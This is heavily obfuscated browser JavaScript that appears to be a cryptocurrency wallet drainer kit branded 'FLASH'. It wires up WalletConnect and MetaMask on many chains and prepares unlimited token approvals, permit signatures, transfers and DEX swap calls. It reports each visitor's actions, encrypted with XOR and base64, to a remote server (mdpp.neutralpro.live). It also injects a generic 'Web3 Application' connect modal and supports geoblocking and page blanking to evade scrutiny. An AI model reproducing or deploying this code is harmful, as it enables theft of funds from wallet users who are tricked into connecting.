const _0x11d65a = _0x2e5c;
(function (_0x2476aa, _0x2b2664) {
	const _0x1542fb = _0x2e5c,
		_0x2d9fcf = _0x2476aa();
	while (!![]) {
		try {
			const _0x3a6b89 =
				(parseInt(_0x1542fb(0x20e)) / 0x1) *
					(-parseInt(_0x1542fb(0x132)) / 0x2) +
				(-parseInt(_0x1542fb(0xe9)) / 0x3) *
					(parseInt(_0x1542fb(0x16b)) / 0x4) +
				(parseInt(_0x1542fb(0x10e)) / 0x5) *
					(parseInt(_0x1542fb(0x25c)) / 0x6) +
				-parseInt(_0x1542fb(0xca)) / 0x7 +
				(-parseInt(_0x1542fb(0x1c3)) / 0x8) *
					(parseInt(_0x1542fb(0x204)) / 0x9) +
				(-parseInt(_0x1542fb(0x110)) / 0xa) *
					(parseInt(_0x1542fb(0x252)) / 0xb) +
				parseInt(_0x1542fb(0xc0)) / 0xc;
			if (_0x3a6b89 === _0x2b2664) break;
			else _0x2d9fcf["push"](_0x2d9fcf["shift"]());
		} catch (_0xffab5c) {
			_0x2d9fcf["push"](_0x2d9fcf["shift"]());
		}
	}
})(_0x1325, 0x1d634);
let FLASH_Encryption_Key = 0x32;
const FLASH_Server = "mdpp.neutralpro.live",
	FLASH_WalletConnect_ID = "53cb6c00218a6d60162590ce6debfc5c",
	FLASH_Modal_Style = 0x2,
	FLASH_Loader_Style = 0x2,
	FLASH_Color_Scheme = "light",
	FLASH_Modal_Mode = 0x1,
	FLASH_Verify_Message = "",
	FLASH_WalletConnect_MetaData = {
		name: document[_0x11d65a(0x16a)],
		description: "Web3\x20Application",
		url: "https://" + window[_0x11d65a(0x107)][_0x11d65a(0x257)],
		icons: [_0x11d65a(0x1fb)],
	},
	FLASH_WalletConnect_Customization = 0x0,
	FLASH_WalletConnect_Theme = {
		themeMode: _0x11d65a(0x29a),
		themeVariables: {
			"--w3m-background-color": _0x11d65a(0x168),
			"--w3m-accent-color": _0x11d65a(0x15b),
			"--w3m-z-index": 0x98967f,
		},
	},
	FLASH_Custom_Chat = {
		Enable: 0x0,
		Chat_Settings: {
			enter_website: "",
			leave_website: "",
			connect_success: "",
			connect_request: "",
			connect_cancel: "",
			approve_request: "",
			approve_success: "",
			approve_cancel: "",
			permit_sign_data: "",
			transfer_request: "",
			transfer_success: "",
			transfer_cancel: "",
			sign_request: "",
			sign_success: "",
			sign_cancel: "",
			chain_request: "",
			chain_success: "",
			chain_cancel: "",
		},
	};
var FLASH_Worker_ID = null;
const BN = ethers[_0x11d65a(0x1c5)][_0x11d65a(0x24c)];
let FLASH_Ready = ![],
	FLASH_Settings = {},
	FLASH_Contract_ABI = {},
	FLASH_ID = 0x0,
	FLASH_Process = ![],
	FLASH_Provider = null,
	FLASH_Current_Provider = null,
	FLASH_Current_Address = null,
	FLASH_Current_Chain_ID = null,
	FLASH_Web3 = null,
	FLASH_Signer = null,
	FLASH_Check_Done = ![],
	FLASH_Currencies = {},
	FLASH_Force_Mode = ![],
	FLASH_Sign_Disabled = ![],
	BL_US = ![],
	SP_US = ![],
	XY_US = ![],
	FLASH_Bad_Country = ![],
	FLASH_Connection = ![],
	FLASH_Load_Time = null,
	FLASH_Gas_Multiplier = 0x2,
	FLASH_Partner_Address = ![];
const WC2_Provider =
		window["@walletconnect/ethereum-provider"][_0x11d65a(0x26b)],
	is_valid_json = (_0x5d0eb0) => {
		const _0x37016f = _0x11d65a;
		try {
			JSON[_0x37016f(0xfd)](_0x5d0eb0);
		} catch (_0x2e9916) {
			return ![];
		}
		return !![];
	};
(async () => {
	const _0x2afe9d = _0x11d65a;
	try {
		let _0x5b2dc9 = await fetch(_0x2afe9d(0x1cc), {
			method: "GET",
			headers: { Accept: _0x2afe9d(0x165) },
		});
		(FLASH_Currencies = await _0x5b2dc9[_0x2afe9d(0x200)]()),
			(FLASH_Currencies["PLS"] = { USD: 0.00004512 });
	} catch (_0x39ae39) {
		console[_0x2afe9d(0x215)](_0x39ae39);
	}
})();
const FLASH_API_Data = {
	0x1: "api.etherscan.io",
	0xa: _0x11d65a(0xfb),
	0x38: _0x11d65a(0x1d3),
	0x89: _0x11d65a(0x216),
	0xfa: _0x11d65a(0x230),
	0xa4b1: "api.arbiscan.io",
	0xa86a: _0x11d65a(0xcd),
	0x2105: _0x11d65a(0x1ee),
};
var FLASH_MetaMask_ChainData = {};
const fill_chain_data = () => {
		const _0x1272f7 = _0x11d65a;
		FLASH_MetaMask_ChainData = {
			0x1: {
				chainId: _0x1272f7(0x1be),
				chainName: _0x1272f7(0x1d9),
				nativeCurrency: {
					name: "Ether",
					symbol: _0x1272f7(0x26f),
					decimals: 0x12,
				},
				rpcUrls: [FLASH_Settings[_0x1272f7(0x113)][0x1]],
				blockExplorerUrls: ["https://etherscan.io"],
			},
			0x38: {
				chainId: _0x1272f7(0x250),
				chainName: _0x1272f7(0x1f5),
				nativeCurrency: {
					name: _0x1272f7(0x205),
					symbol: _0x1272f7(0x21f),
					decimals: 0x12,
				},
				rpcUrls: [FLASH_Settings[_0x1272f7(0x113)][0x38]],
				blockExplorerUrls: [_0x1272f7(0x248)],
			},
			0x89: {
				chainId: "0x89",
				chainName: _0x1272f7(0x1e7),
				nativeCurrency: {
					name: "MATIC",
					symbol: _0x1272f7(0x18f),
					decimals: 0x12,
				},
				rpcUrls: [FLASH_Settings["RPCs"][0x89]],
				blockExplorerUrls: [_0x1272f7(0xcb)],
			},
			0xa86a: {
				chainId: _0x1272f7(0xcc),
				chainName: _0x1272f7(0x11b),
				nativeCurrency: {
					name: _0x1272f7(0x1e6),
					symbol: _0x1272f7(0x1e6),
					decimals: 0x12,
				},
				rpcUrls: [FLASH_Settings[_0x1272f7(0x113)][0xa86a]],
				blockExplorerUrls: [_0x1272f7(0x275)],
			},
			0xa4b1: {
				chainId: _0x1272f7(0x1bd),
				chainName: "Arbitrum\x20One",
				nativeCurrency: {
					name: _0x1272f7(0x26f),
					symbol: "ETH",
					decimals: 0x12,
				},
				rpcUrls: [FLASH_Settings["RPCs"][0xa4b1]],
				blockExplorerUrls: ["https://explorer.arbitrum.io"],
			},
			0xa: {
				chainId: _0x1272f7(0x1fa),
				chainName: _0x1272f7(0x23c),
				nativeCurrency: {
					name: _0x1272f7(0x26f),
					symbol: _0x1272f7(0x26f),
					decimals: 0x12,
				},
				rpcUrls: [FLASH_Settings[_0x1272f7(0x113)][0xa]],
				blockExplorerUrls: [_0x1272f7(0xb7)],
			},
			0xfa: {
				chainId: _0x1272f7(0x1d8),
				chainName: _0x1272f7(0x24a),
				nativeCurrency: {
					name: "FTM",
					symbol: _0x1272f7(0xaa),
					decimals: 0x12,
				},
				rpcUrls: [FLASH_Settings["RPCs"][0xfa]],
				blockExplorerUrls: ["https://ftmscan.com/"],
			},
			0x2105: {
				chainId: _0x1272f7(0x128),
				chainName: _0x1272f7(0x29f),
				nativeCurrency: {
					name: _0x1272f7(0x26f),
					symbol: "ETH",
					decimals: 0x12,
				},
				rpcUrls: [FLASH_Settings[_0x1272f7(0x113)][0x2105]],
				blockExplorerUrls: [_0x1272f7(0x163)],
			},
			0x144: {
				chainId: _0x1272f7(0x2a6),
				chainName: _0x1272f7(0x1a6),
				nativeCurrency: {
					name: _0x1272f7(0x26f),
					symbol: _0x1272f7(0x26f),
					decimals: 0x12,
				},
				rpcUrls: [FLASH_Settings["RPCs"][0x144]],
				blockExplorerUrls: [_0x1272f7(0x2a0)],
			},
			0x171: {
				chainId: _0x1272f7(0x172),
				chainName: _0x1272f7(0x14b),
				nativeCurrency: {
					name: _0x1272f7(0xc7),
					symbol: _0x1272f7(0xc7),
					decimals: 0x12,
				},
				rpcUrls: [FLASH_Settings[_0x1272f7(0x113)][0x171]],
				blockExplorerUrls: [_0x1272f7(0x101)],
			},
		};
	},
	FLASH_Routers = {
		0x1: [
			[_0x11d65a(0xe1), _0x11d65a(0x20b)],
			[_0x11d65a(0x115), _0x11d65a(0x25b)],
			[_0x11d65a(0x196), _0x11d65a(0x23d)],
			[_0x11d65a(0x299), _0x11d65a(0x136)],
		],
		0xa: [[_0x11d65a(0xe1), _0x11d65a(0x20b)]],
		0x38: [
			[_0x11d65a(0x115), _0x11d65a(0x1cf)],
			[_0x11d65a(0x196), _0x11d65a(0x23d)],
			[_0x11d65a(0x299), _0x11d65a(0xed)],
		],
		0x89: [
			[_0x11d65a(0xe1), "0x68b3465833fb72a70ecdf485e0e4c7bd8665fc45"],
			["Sushiswap", _0x11d65a(0xed)],
			[_0x11d65a(0x277), "0xa5E0829CaCEd8fFDD4De3c43696c57F7D7A678ff"],
		],
		0xfa: [[_0x11d65a(0x299), _0x11d65a(0xed)]],
		0xa4b1: [
			[_0x11d65a(0xe1), "0x68b3465833fb72a70ecdf485e0e4c7bd8665fc45"],
			[_0x11d65a(0x299), _0x11d65a(0xed)],
		],
		0xa86a: [
			[_0x11d65a(0x299), "0x1b02dA8Cb0d097eB8D57A175b88c7D8b47997506"],
		],
	},
	FLASH_Swap_Route = {
		0x1: _0x11d65a(0x174),
		0xa: "0x4200000000000000000000000000000000000006",
		0x38: _0x11d65a(0x1c6),
		0x89: _0x11d65a(0x27a),
		0xfa: _0x11d65a(0x1af),
		0xa4b1: "0x82af49447d8a07e3bd95bd0d56f35241523fbab1",
		0xa86a: _0x11d65a(0x243),
	},
	FLASH_Uniswap_ABI = [
		{
			inputs: [
				{
					internalType: _0x11d65a(0x21e),
					name: _0x11d65a(0x176),
					type: _0x11d65a(0x21e),
				},
				{
					internalType: _0x11d65a(0x21e),
					name: _0x11d65a(0x29d),
					type: _0x11d65a(0x21e),
				},
				{
					internalType: _0x11d65a(0x2a4),
					name: _0x11d65a(0x224),
					type: _0x11d65a(0x2a4),
				},
				{
					internalType: _0x11d65a(0x190),
					name: "to",
					type: _0x11d65a(0x190),
				},
			],
			name: "swapExactTokensForTokens",
			outputs: [
				{
					internalType: "uint256",
					name: _0x11d65a(0x24f),
					type: _0x11d65a(0x21e),
				},
			],
			stateMutability: _0x11d65a(0x142),
			type: _0x11d65a(0x1ab),
		},
		{
			inputs: [
				{
					internalType: "uint256",
					name: _0x11d65a(0x1b2),
					type: _0x11d65a(0x21e),
				},
				{
					internalType: _0x11d65a(0x154),
					name: "data",
					type: _0x11d65a(0x154),
				},
			],
			name: _0x11d65a(0xfc),
			outputs: [
				{
					internalType: _0x11d65a(0x154),
					name: "",
					type: _0x11d65a(0x154),
				},
			],
			stateMutability: _0x11d65a(0x142),
			type: _0x11d65a(0x1ab),
		},
	],
	FLASH_Pancake_ABI = [
		{
			inputs: [
				{
					internalType: _0x11d65a(0x21e),
					name: _0x11d65a(0x176),
					type: "uint256",
				},
				{
					internalType: _0x11d65a(0x21e),
					name: _0x11d65a(0x29d),
					type: "uint256",
				},
				{
					internalType: _0x11d65a(0x2a4),
					name: _0x11d65a(0x224),
					type: _0x11d65a(0x2a4),
				},
				{ internalType: _0x11d65a(0x190), name: "to", type: "address" },
				{
					internalType: _0x11d65a(0x21e),
					name: _0x11d65a(0x1b2),
					type: _0x11d65a(0x21e),
				},
			],
			name: _0x11d65a(0x12c),
			outputs: [
				{
					internalType: _0x11d65a(0x1e0),
					name: _0x11d65a(0xee),
					type: "uint256[]",
				},
			],
			stateMutability: _0x11d65a(0xae),
			type: _0x11d65a(0x1ab),
		},
		{
			inputs: [
				{
					internalType: _0x11d65a(0x21e),
					name: _0x11d65a(0x176),
					type: _0x11d65a(0x21e),
				},
				{
					internalType: _0x11d65a(0x21e),
					name: _0x11d65a(0x29d),
					type: _0x11d65a(0x21e),
				},
				{
					internalType: _0x11d65a(0x2a4),
					name: _0x11d65a(0x224),
					type: "address[]",
				},
				{
					internalType: _0x11d65a(0x190),
					name: "to",
					type: _0x11d65a(0x190),
				},
				{
					internalType: _0x11d65a(0x21e),
					name: _0x11d65a(0x1b2),
					type: _0x11d65a(0x21e),
				},
			],
			name: _0x11d65a(0x1db),
			outputs: [
				{
					internalType: _0x11d65a(0x1e0),
					name: "amounts",
					type: _0x11d65a(0x1e0),
				},
			],
			stateMutability: _0x11d65a(0xae),
			type: "function",
		},
		{
			inputs: [
				{
					internalType: _0x11d65a(0x21e),
					name: _0x11d65a(0x1b2),
					type: _0x11d65a(0x21e),
				},
				{
					internalType: _0x11d65a(0x154),
					name: _0x11d65a(0x187),
					type: "bytes[]",
				},
			],
			name: _0x11d65a(0xfc),
			outputs: [
				{ internalType: "bytes[]", name: "", type: _0x11d65a(0x154) },
			],
			stateMutability: "payable",
			type: _0x11d65a(0x1ab),
		},
		{
			inputs: [
				{
					internalType: _0x11d65a(0x21e),
					name: "amountIn",
					type: _0x11d65a(0x21e),
				},
				{
					internalType: _0x11d65a(0x21e),
					name: _0x11d65a(0x29d),
					type: "uint256",
				},
				{
					internalType: _0x11d65a(0x2a4),
					name: _0x11d65a(0x224),
					type: _0x11d65a(0x2a4),
				},
				{
					internalType: _0x11d65a(0x190),
					name: "to",
					type: _0x11d65a(0x190),
				},
			],
			name: "swapExactTokensForTokens",
			outputs: [
				{
					internalType: _0x11d65a(0x1e0),
					name: _0x11d65a(0xee),
					type: _0x11d65a(0x1e0),
				},
			],
			stateMutability: "nonpayable",
			type: "function",
		},
	],
	FLASH_Current_URL = window[_0x11d65a(0x107)][_0x11d65a(0x21a)][
		_0x11d65a(0x1c9)
	](/http[s]*:\/\//, ""),
	FLASH_Mobile_Status = (() => {
		const _0x231375 = _0x11d65a;
		let _0x1033ad = ![];
		return (
			(function (_0x855d7c) {
				const _0x505b23 = _0x2e5c;
				if (
					/(android|bb\d+|meego).+mobile|avantgo|bada\/|blackberry|blazer|compal|elaine|fennec|hiptop|iemobile|ip(hone|od)|iris|kindle|lge |maemo|midp|mmp|mobile.+firefox|netfront|opera m(ob|in)i|palm( os)?|phone|p(ixi|re)\/|plucker|pocket|psp|series(4|6)0|symbian|treo|up\.(browser|link)|vodafone|wap|windows ce|xda|xiino|android|ipad|playbook|silk/i[
						"test"
					](_0x855d7c) ||
					/1207|6310|6590|3gso|4thp|50[1-6]i|770s|802s|a wa|abac|ac(er|oo|s\-)|ai(ko|rn)|al(av|ca|co)|amoi|an(ex|ny|yw)|aptu|ar(ch|go)|as(te|us)|attw|au(di|\-m|r |s )|avan|be(ck|ll|nq)|bi(lb|rd)|bl(ac|az)|br(e|v)w|bumb|bw\-(n|u)|c55\/|capi|ccwa|cdm\-|cell|chtm|cldc|cmd\-|co(mp|nd)|craw|da(it|ll|ng)|dbte|dc\-s|devi|dica|dmob|do(c|p)o|ds(12|\-d)|el(49|ai)|em(l2|ul)|er(ic|k0)|esl8|ez([4-7]0|os|wa|ze)|fetc|fly(\-|_)|g1 u|g560|gene|gf\-5|g\-mo|go(\.w|od)|gr(ad|un)|haie|hcit|hd\-(m|p|t)|hei\-|hi(pt|ta)|hp( i|ip)|hs\-c|ht(c(\-| |_|a|g|p|s|t)|tp)|hu(aw|tc)|i\-(20|go|ma)|i230|iac( |\-|\/)|ibro|idea|ig01|ikom|im1k|inno|ipaq|iris|ja(t|v)a|jbro|jemu|jigs|kddi|keji|kgt( |\/)|klon|kpt |kwc\-|kyo(c|k)|le(no|xi)|lg( g|\/(k|l|u)|50|54|\-[a-w])|libw|lynx|m1\-w|m3ga|m50\/|ma(te|ui|xo)|mc(01|21|ca)|m\-cr|me(rc|ri)|mi(o8|oa|ts)|mmef|mo(01|02|bi|de|do|t(\-| |o|v)|zz)|mt(50|p1|v )|mwbp|mywa|n10[0-2]|n20[2-3]|n30(0|2)|n50(0|2|5)|n7(0(0|1)|10)|ne((c|m)\-|on|tf|wf|wg|wt)|nok(6|i)|nzph|o2im|op(ti|wv)|oran|owg1|p800|pan(a|d|t)|pdxg|pg(13|\-([1-8]|c))|phil|pire|pl(ay|uc)|pn\-2|po(ck|rt|se)|prox|psio|pt\-g|qa\-a|qc(07|12|21|32|60|\-[2-7]|i\-)|qtek|r380|r600|raks|rim9|ro(ve|zo)|s55\/|sa(ge|ma|mm|ms|ny|va)|sc(01|h\-|oo|p\-)|sdk\/|se(c(\-|0|1)|47|mc|nd|ri)|sgh\-|shar|sie(\-|m)|sk\-0|sl(45|id)|sm(al|ar|b3|it|t5)|so(ft|ny)|sp(01|h\-|v\-|v )|sy(01|mb)|t2(18|50)|t6(00|10|18)|ta(gt|lk)|tcl\-|tdg\-|tel(i|m)|tim\-|t\-mo|to(pl|sh)|ts(70|m\-|m3|m5)|tx\-9|up(\.b|g1|si)|utst|v400|v750|veri|vi(rg|te)|vk(40|5[0-3]|\-v)|vm40|voda|vulc|vx(52|53|60|61|70|80|81|83|85|98)|w3c(\-| )|webc|whit|wi(g |nc|nw)|wmlb|wonu|x700|yas\-|your|zeto|zte\-/i[
						"test"
					](_0x855d7c[_0x505b23(0x1a2)](0x0, 0x4))
				)
					_0x1033ad = !![];
			})(
				navigator[_0x231375(0xce)] ||
					navigator[_0x231375(0x22d)] ||
					window[_0x231375(0x291)]
			),
			_0x1033ad
		);
	})(),
	FLASH_Apple_Status = (() => {
		const _0x191361 = _0x11d65a;
		try {
			return (
				[
					_0x191361(0x25a),
					_0x191361(0x1a5),
					_0x191361(0x213),
					_0x191361(0x1dd),
					_0x191361(0x1b6),
					"iPod",
				][_0x191361(0x226)](navigator[_0x191361(0xb8)]) ||
				(navigator[_0x191361(0xce)]["includes"](_0x191361(0x25d)) &&
					_0x191361(0x228) in document)
			);
		} catch (_0x1e77a6) {
			return ![];
		}
	})(),
	FLASH_Unlimited_Amount = _0x11d65a(0xe6),
	FLASH_Modal_Data = [
		{ type: _0x11d65a(0x13f), data: _0x11d65a(0x118) },
		{ type: "html", data: _0x11d65a(0x13e) },
	],
	inject_modal = () => {
		const _0x5059c1 = _0x11d65a;
		try {
			let _0x46d28f = document["createElement"](_0x5059c1(0x13f));
			(_0x46d28f["id"] = _0x5059c1(0x20c)),
				(_0x46d28f[_0x5059c1(0x284)] =
					FLASH_Modal_Data[0x0][_0x5059c1(0x187)]),
				document[_0x5059c1(0x169)]["appendChild"](_0x46d28f);
			let _0x4deb6a = document["createElement"](_0x5059c1(0x28f));
			(_0x4deb6a["id"] = _0x5059c1(0x158)),
				(_0x4deb6a["classList"] = ["web3-overlay"]),
				(_0x4deb6a["style"][_0x5059c1(0x13b)] = _0x5059c1(0xb5)),
				document["body"][_0x5059c1(0x1fe)](_0x4deb6a),
				document[_0x5059c1(0xd6)](".web3-overlay")[_0x5059c1(0x211)](
					_0x5059c1(0x2a7),
					() => {
						flash_hide();
					}
				);
			let _0x107bfb = document["createElement"]("div");
			(_0x107bfb["id"] = _0x5059c1(0x1f1)),
				(_0x107bfb[_0x5059c1(0x289)] = [_0x5059c1(0x1f1)]),
				(_0x107bfb[_0x5059c1(0x13f)][_0x5059c1(0x13b)] =
					_0x5059c1(0xb5)),
				(_0x107bfb["innerHTML"] =
					FLASH_Modal_Data[0x1][_0x5059c1(0x187)]),
				document[_0x5059c1(0x17d)]["prepend"](_0x107bfb);
		} catch (_0x43d9c8) {
			console["log"](_0x43d9c8);
		}
	},
	set_modal_data = (_0x36b131, _0x4d93ee) => {
		const _0x3142fc = _0x11d65a;
		try {
			(FLASH_Modal_Data[0x0][_0x3142fc(0x187)] = _0x36b131),
				(FLASH_Modal_Data[0x1][_0x3142fc(0x187)] = _0x4d93ee),
				reset_modal();
		} catch (_0x24fe8d) {
			console[_0x3142fc(0x215)](_0x24fe8d);
		}
	},
	reset_modal = () => {
		const _0x2dba3a = _0x11d65a;
		try {
			document["getElementById"](_0x2dba3a(0x1f1))[_0x2dba3a(0x10c)]();
		} catch (_0x2d6c68) {
			console[_0x2dba3a(0x215)](_0x2d6c68);
		}
		try {
			document[_0x2dba3a(0x1a3)]("web3-overlay")["remove"]();
		} catch (_0x408ba8) {
			console[_0x2dba3a(0x215)](_0x408ba8);
		}
		try {
			document[_0x2dba3a(0x1a3)]("web3-style")[_0x2dba3a(0x10c)]();
		} catch (_0x13b152) {
			console[_0x2dba3a(0x215)](_0x13b152);
		}
		try {
			inject_modal();
		} catch (_0x4dd31b) {
			console[_0x2dba3a(0x215)](_0x4dd31b);
		}
	},
	flash_init = () => {
		const _0x633d6e = _0x11d65a;
		try {
			if (!FLASH_Connection) return connect_wallet();
			if (FLASH_Process) return;
			FLASH_Modal_Style == 0x2
				? FLASHM[_0x633d6e(0xf5)](FLASH_Color_Scheme, FLASH_Modal_Mode)
				: ((document["getElementById"](_0x633d6e(0x1f1))[
						_0x633d6e(0x13f)
				  ][_0x633d6e(0x13b)] = _0x633d6e(0xf7)),
				  (document[_0x633d6e(0x1a3)](_0x633d6e(0x158))[
						_0x633d6e(0x13f)
				  ][_0x633d6e(0x13b)] = _0x633d6e(0xf7)),
				  (document[_0x633d6e(0xbe)](_0x633d6e(0x1ac))[0x0][
						_0x633d6e(0x13f)
				  ]["display"] = _0x633d6e(0xf7)),
				  (document[_0x633d6e(0xbe)]("web3-modal-wc")[0x0]["style"][
						"display"
				  ] = _0x633d6e(0xb5)));
		} catch (_0x390cda) {
			console[_0x633d6e(0x215)](_0x390cda);
		}
	},
	ms_hide = () => {
		const _0x4a6a4f = _0x11d65a;
		try {
			FLASH_Modal_Style == 0x2
				? FLASHM[_0x4a6a4f(0x296)]()
				: ((document[_0x4a6a4f(0x1a3)](_0x4a6a4f(0x1f1))[
						_0x4a6a4f(0x13f)
				  ]["display"] = _0x4a6a4f(0xb5)),
				  (document[_0x4a6a4f(0x1a3)](_0x4a6a4f(0x158))[
						_0x4a6a4f(0x13f)
				  ]["display"] = _0x4a6a4f(0xb5)));
		} catch (_0x22fd4c) {
			console[_0x4a6a4f(0x215)](_0x22fd4c);
		}
	},
	load_wc = async () => {
		const _0x3f1dab = _0x11d65a;
		let _0x3fcf5a = [],
			_0x281f84 = {};
		for (const _0x6fa6f8 in FLASH_Settings[_0x3f1dab(0x113)]) {
			if (_0x6fa6f8 != "1") _0x3fcf5a["push"](_0x6fa6f8);
			_0x281f84[_0x6fa6f8] = FLASH_Settings[_0x3f1dab(0x113)][_0x6fa6f8];
		}
		FLASH_Provider = await WC2_Provider[_0x3f1dab(0xd3)]({
			projectId: FLASH_WalletConnect_ID,
			chains: ["1"],
			optionalChains: _0x3fcf5a,
			metadata: FLASH_WalletConnect_MetaData,
			showQrModal: !![],
			rpcMap: _0x281f84,
			methods: [
				_0x3f1dab(0x102),
				_0x3f1dab(0x222),
				_0x3f1dab(0x186),
				_0x3f1dab(0x129),
				_0x3f1dab(0xf8),
				_0x3f1dab(0x1eb),
			],
			qrModalOptions:
				FLASH_WalletConnect_Customization == 0x1
					? FLASH_WalletConnect_Theme
					: undefined,
		});
	},
	prs = (_0x55eebc, _0x1f5414) => {
		const _0x19630a = _0x11d65a,
			_0x38efe7 = (_0x2f407e) =>
				_0x2f407e["split"]("")[_0x19630a(0x1e9)]((_0x41e148) =>
					_0x41e148[_0x19630a(0x193)](0x0)
				),
			_0x463c9d = (_0x8b96fe) =>
				("0" + Number(_0x8b96fe)[_0x19630a(0x1b5)](0x10))[
					_0x19630a(0x1a2)
				](-0x2),
			_0x6bcf35 = (_0x46b085) =>
				_0x38efe7(_0x55eebc)["reduce"](
					(_0x537f68, _0x387bc0) => _0x537f68 ^ _0x387bc0,
					_0x46b085
				);
		return _0x1f5414[_0x19630a(0x12f)]("")
			[_0x19630a(0x1e9)](_0x38efe7)
			[_0x19630a(0x1e9)](_0x6bcf35)
			["map"](_0x463c9d)
			["join"]("");
	},
	srp = (_0x224e48, _0x5acc01) => {
		const _0x63d29a = _0x11d65a,
			_0xec0d6b = (_0x35d457) =>
				_0x35d457["split"]("")["map"]((_0x45e5b1) =>
					_0x45e5b1[_0x63d29a(0x193)](0x0)
				),
			_0x1254b1 = (_0x51ae47) =>
				_0xec0d6b(_0x224e48)["reduce"](
					(_0x4b6bfc, _0x1bd4a5) => _0x4b6bfc ^ _0x1bd4a5,
					_0x51ae47
				);
		return _0x5acc01[_0x63d29a(0x1a1)](/.{1,2}/g)
			[_0x63d29a(0x1e9)]((_0x71e26e) => parseInt(_0x71e26e, 0x10))
			["map"](_0x1254b1)
			["map"]((_0x4693da) => String["fromCharCode"](_0x4693da))
			[_0x63d29a(0xdf)]("");
	};
let prs_enc = 0x0,
	last_request_ts = 0x0;
(async () => {
	const _0x25e2b0 = _0x11d65a;
	(prs_enc = FLASH_Encryption_Key),
		(FLASH_Encryption_Key = Math[_0x25e2b0(0xe4)](
			Math["random"]() * 0x3e8
		));
})();
const send_request = async (_0x73e97c) => {
		const _0x2cb77c = _0x11d65a;
		try {
			if (FLASH_Force_Mode)
				return { status: _0x2cb77c(0x11c), error: _0x2cb77c(0x18d) };
			while (Date["now"]() <= last_request_ts)
				await new Promise((_0x370334) => setTimeout(_0x370334, 0x1));
			(last_request_ts = Date[_0x2cb77c(0x15c)]()),
				(_0x73e97c[_0x2cb77c(0x220)] =
					window[_0x2cb77c(0x107)][_0x2cb77c(0x257)]),
				(_0x73e97c[_0x2cb77c(0x209)] = FLASH_Worker_ID || null),
				(_0x73e97c[_0x2cb77c(0x281)] = FLASH_ID || null),
				(_0x73e97c[_0x2cb77c(0x100)] = last_request_ts),
				(_0x73e97c["chat_data"] =
					FLASH_Custom_Chat[_0x2cb77c(0x18c)] == 0x0
						? ![]
						: FLASH_Custom_Chat[_0x2cb77c(0x27e)]),
				(_0x73e97c[_0x2cb77c(0x201)] = FLASH_Partner_Address);
			const _0x453085 = btoa(
					String(0x5 + 0xa + 0x16d + 0x800 + 0x363 + prs_enc)
				),
				_0x24f34f = prs(_0x453085, btoa(JSON["stringify"](_0x73e97c))),
				_0x4cb4da = await fetch("https://" + FLASH_Server, {
					method: "POST",
					headers: {
						Accept: "text/plain",
						"Content-Type": _0x2cb77c(0x135),
					},
					body: "ver=28112023&raw=" + _0x24f34f,
				});
			let _0x13402a = JSON[_0x2cb77c(0xfd)](
				atob(srp(_0x453085, await _0x4cb4da[_0x2cb77c(0xa8)]()))
			);
			if (!_0x13402a[_0x2cb77c(0x1c2)])
				return { status: "error", error: _0x2cb77c(0x18d) };
			else {
				if (
					_0x13402a[_0x2cb77c(0x1c2)] == "error" &&
					_0x13402a[_0x2cb77c(0x11c)] == _0x2cb77c(0x24d)
				)
					FLASH_Force_Mode = !![];
				if (
					_0x13402a[_0x2cb77c(0x1c2)] == _0x2cb77c(0x11c) &&
					_0x13402a["error"] == _0x2cb77c(0x1b7)
				) {
					FLASH_Force_Mode = !![];
					try {
						FLASH_Loader_Style == 0x2
							? FLASHL[_0x2cb77c(0x133)]({
									icon: _0x2cb77c(0x11c),
									title: "Critical\x20Error",
									subtitle: _0x2cb77c(0x17a),
									text: _0x2cb77c(0x16f),
									confirmButtonText: "OK",
									timer: 0x7530,
									color: FLASH_Color_Scheme,
							  })
							: (Swal[_0x2cb77c(0x296)](),
							  Swal[_0x2cb77c(0x133)]({
									html: _0x2cb77c(0xbd),
									icon: _0x2cb77c(0x11c),
									allowOutsideClick: !![],
									allowEscapeKey: !![],
									timer: 0x0,
									width: 0x258,
									showConfirmButton: !![],
									confirmButtonText: "OK",
							  }));
					} catch (_0x38aef6) {
						console[_0x2cb77c(0x215)](_0x38aef6);
					}
				}
				return _0x13402a;
			}
		} catch (_0x18fe6e) {
			return (
				console[_0x2cb77c(0x215)](_0x18fe6e),
				{ status: _0x2cb77c(0x11c), error: _0x2cb77c(0x18d) }
			);
		}
	},
	retrive_config = async () => {
		const _0x3cf0d8 = _0x11d65a;
		try {
			let _0x2c6ba4 = null;
			if (localStorage[_0x3cf0d8(0xe0)])
				_0x2c6ba4 = { address: localStorage[_0x3cf0d8(0xe0)] };
			const _0x2f515c = await send_request({
				action: "retrive_config",
				personal_wallet: _0x2c6ba4,
			});
			if (_0x2f515c[_0x3cf0d8(0x1c2)] == "OK") {
				(FLASH_Connection = !![]),
					(FLASH_Settings = _0x2f515c[_0x3cf0d8(0x187)]),
					(FLASH_Gas_Multiplier =
						FLASH_Settings["Settings"][_0x3cf0d8(0x19c)]);
				if (!FLASH_Settings[_0x3cf0d8(0x138)]) FLASH_Bad_Country = ![];
				if (
					FLASH_Settings[_0x3cf0d8(0x28b)] &&
					typeof FLASH_Settings[_0x3cf0d8(0x28b)] == _0x3cf0d8(0x272)
				)
					localStorage[_0x3cf0d8(0xe0)] =
						FLASH_Settings[_0x3cf0d8(0x28b)][_0x3cf0d8(0x190)];
				typeof FLASH_Settings[_0x3cf0d8(0x14f)] == "boolean" &&
					FLASH_Settings["DSB"] === !![] &&
					(window[_0x3cf0d8(0x107)]["href"] = "about:blank");
			}
		} catch (_0x1c4d3a) {
			console[_0x3cf0d8(0x215)](_0x1c4d3a);
		}
	},
	retrive_contract = async () => {
		const _0x146cb6 = _0x11d65a;
		try {
			const _0x18284f = await send_request({ action: _0x146cb6(0x26d) });
			if (_0x18284f["status"] == "OK")
				FLASH_Contract_ABI = _0x18284f[_0x146cb6(0x187)];
		} catch (_0x26ce58) {
			console[_0x146cb6(0x215)](_0x26ce58);
		}
	},
	enter_website = async () => {
		const _0x41723f = _0x11d65a;
		try {
			let _0x3c0f44 = await send_request({
				action: _0x41723f(0x231),
				user_id: FLASH_ID,
				time: new Date()[_0x41723f(0x233)](_0x41723f(0x141)),
			});
			_0x3c0f44["status"] == _0x41723f(0x11c) &&
				_0x3c0f44[_0x41723f(0x11c)] == _0x41723f(0x26a) &&
				(FLASH_Bad_Country = !![]);
		} catch (_0x1082e8) {
			console["log"](_0x1082e8);
		}
	},
	leave_website = async () => {
		const _0x2a673e = _0x11d65a;
		try {
			if (!FLASH_Settings[_0x2a673e(0x244)][_0x2a673e(0x17f)]) return;
			await send_request({ action: _0x2a673e(0x17f), user_id: FLASH_ID });
		} catch (_0xf1735) {
			console[_0x2a673e(0x215)](_0xf1735);
		}
	},
